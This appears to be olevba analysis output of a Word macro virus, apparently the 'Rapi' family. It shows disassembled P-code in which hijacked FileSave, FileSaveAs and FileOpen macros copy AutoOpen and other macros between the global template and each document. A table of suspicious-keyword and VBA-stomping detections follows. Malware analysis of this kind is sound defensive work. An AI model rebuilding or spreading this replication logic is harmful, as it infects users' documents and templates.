' 	Ld sMacro$ 
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #28:
' 	Label Abort 
' Line #29:
' 	EndSub 
' Macros/VBA/FileSave - 2931 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn sMe
' Line #3:
' 	Dim 
' 	VarDefn sTMacro
' Line #4:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #5:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Bail 
' Line #6:
' Line #7:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #8:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #9:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #10:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #11:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #12:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpAE"
' 	Add 
' 	St sTMacro$ 
' Line #13:
' 	LitStr 0x000B "Global:RpAE"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #14:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St sTMacro$ 
' Line #15:
' 	LitStr 0x000B "Global:RpAO"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #16:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpFS"
' 	Add 
' 	St sTMacro$ 
' Line #17:
' 	LitStr 0x000B "Global:RpFS"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #18:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpTC"
' 	Add 
' 	St sTMacro$ 
' Line #19:
' 	LitStr 0x0015 "Global:ToolsCustomize"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #20:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpTM"
' 	Add 
' 	St sTMacro$ 
' Line #21:
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #22:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":RpFSA"
' 	Add 
' 	St sTMacro$ 
' Line #23:
' 	LitStr 0x000C "Global:RpFSA"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #24:
' 	GoTo Done 
' Line #25:
' 	Label Bail 
' Line #26:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Ne 
' 	IfBlock 
' Line #27:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	Label Done 
' Line #30:
' 	EndSub 
' Macros/VBA/RpFS - 2375 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn sMe
' Line #3:
' 	Dim 
' 	VarDefn sTMacro
' Line #4:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #5:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Bail 
' Line #6:
' Line #7:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #8:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #9:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #10:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #11:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #12:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpAE"
' 	Add 
' 	St sTMacro$ 
' Line #13:
' 	LitStr 0x000B "Global:RpAE"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #14:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St sTMacro$ 
' Line #15:
' 	LitStr 0x000B "Global:RpAO"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #16:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpFS"
' 	Add 
' 	St sTMacro$ 
' Line #17:
' 	LitStr 0x000B "Global:RpFS"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #18:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpTC"
' 	Add 
' 	St sTMacro$ 
' Line #19:
' 	LitStr 0x0015 "Global:ToolsCustomize"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #20:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpTM"
' 	Add 
' 	St sTMacro$ 
' Line #21:
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #22:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":RpFSA"
' 	Add 
' 	St sTMacro$ 
' Line #23:
' 	LitStr 0x000C "Global:RpFSA"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #24:
' 	GoTo Done 
' Line #25:
' 	Label Bail 
' Line #26:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Ne 
' 	IfBlock 
' Line #27:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	Label Done 
' Line #30:
' 	EndSub 
' Macros/VBA/FileSaveAs - 3042 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn sMe
' Line #3:
' 	Dim 
' 	VarDefn sTMacro
' Line #4:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Bail 
' Line #5:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #6:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #7:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #8:
' Line #9:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #10:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #11:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #12:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpAE"
' 	Add 
' 	St sTMacro$ 
' Line #13:
' 	LitStr 0x000B "Global:RpAE"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #14:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St sTMacro$ 
' Line #15:
' 	LitStr 0x000B "Global:RpAO"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #16:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpFS"
' 	Add 
' 	St sTMacro$ 
' Line #17:
' 	LitStr 0x000B "Global:RpFS"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #18:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpFO"
' 	Add 
' 	St sTMacro$ 
' Line #19:
' 	LitStr 0x000B "Global:RpFO"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #20:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpTC"
' 	Add 
' 	St sTMacro$ 
' Line #21:
' 	LitStr 0x0015 "Global:ToolsCustomize"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #22:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpTM"
' 	Add 
' 	St sTMacro$ 
' Line #23:
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #24:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":RpFSA"
' 	Add 
' 	St sTMacro$ 
' Line #25:
' 	LitStr 0x000C "Global:RpFSA"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #26:
' 	GoTo Done 
' Line #27:
' Line #28:
' 	Label Bail 
' Line #29:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Ne 
' 	IfBlock 
' Line #30:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	Label Done 
' Line #33:
' 	EndSub 
' Macros/VBA/RpFSA - 2496 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn sMe
' Line #3:
' 	Dim 
' 	VarDefn sTMacro
' Line #4:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Bail 
' Line #5:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #6:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #7:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #8:
' Line #9:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #10:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #11:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #12:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpAE"
' 	Add 
' 	St sTMacro$ 
' Line #13:
' 	LitStr 0x000B "Global:RpAE"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #14:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St sTMacro$ 
' Line #15:
' 	LitStr 0x000B "Global:RpAO"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #16:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpFS"
' 	Add 
' 	St sTMacro$ 
' Line #17:
' 	LitStr 0x000B "Global:RpFS"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #18:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpFO"
' 	Add 
' 	St sTMacro$ 
' Line #19:
' 	LitStr 0x000B "Global:RpFO"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #20:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpTC"
' 	Add 
' 	St sTMacro$ 
' Line #21:
' 	LitStr 0x0015 "Global:ToolsCustomize"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #22:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpTM"
' 	Add 
' 	St sTMacro$ 
' Line #23:
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #24:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":RpFSA"
' 	Add 
' 	St sTMacro$ 
' Line #25:
' 	LitStr 0x000C "Global:RpFSA"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #26:
' 	GoTo Done 
' Line #27:
' Line #28:
' 	Label Bail 
' Line #29:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Ne 
' 	IfBlock 
' Line #30:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	Label Done 
' Line #33:
' 	EndSub 
' Macros/VBA/FileOpen - 2916 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn sMe
' Line #3:
' 	Dim 
' 	VarDefn sTMacro
' Line #4:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Bail 
' Line #5:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileOpen 0x0001 
' 	Set dlg 
' Line #6:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileOpen 0x0001 
' Line #7:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileOpen 0x0001 
' Line #8:
' Line #9:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileOpen 0x0001 
' Line #10:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #11:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpAE"
' 	Add 
' 	St sTMacro$ 
' Line #12:
' 	LitStr 0x000B "Global:RpAE"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #13:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St sTMacro$ 
' Line #14:
' 	LitStr 0x000B "Global:RpAO"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #15:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpFS"
' 	Add 
' 	St sTMacro$ 
' Line #16:
' 	LitStr 0x000B "Global:RpFS"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #17:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpFO"
' 	Add 
' 	St sTMacro$ 
' Line #18:
' 	LitStr 0x000B "Global:RpFO"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #19:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpTC"
' 	Add 
' 	St sTMacro$ 
' Line #20:
' 	LitStr 0x0015 "Global:ToolsCustomize"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #21:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpTM"
' 	Add 
' 	St sTMacro$ 
' Line #22:
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #23:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":RpFSA"
' 	Add 
' 	St sTMacro$ 
' Line #24:
' 	LitStr 0x000C "Global:RpFSA"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #25:
' 	LitStr 0x001D "Thank's for joining with us !"
' 	LitStr 0x0009 "@Rapi.Kom"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #26:
' 	GoTo Done 
' Line #27:
' 	Label Bail 
' Line #28:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Ne 
' 	IfBlock 
' Line #29:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileOpen 0x0001 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Label Done 
' Line #32:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

